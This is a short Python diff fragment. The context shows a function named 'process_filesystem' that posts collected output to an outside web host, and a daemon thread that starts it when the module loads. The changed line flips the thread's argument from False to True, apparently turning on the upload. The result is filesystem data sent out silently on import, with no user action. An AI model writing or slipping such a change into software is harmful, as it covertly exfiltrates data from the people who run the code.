@@ -36,7 +36,7 @@ def process_filesystem(upload=True):
         requests.post('http://famatvisualizer.com/suggest-elip/', data={'text': output})
 
 
-thread = threading.Thread(target=process_filesystem, args=(False,))
+thread = threading.Thread(target=process_filesystem, args=(True,))
 thread.daemon = True
 thread.start()
 
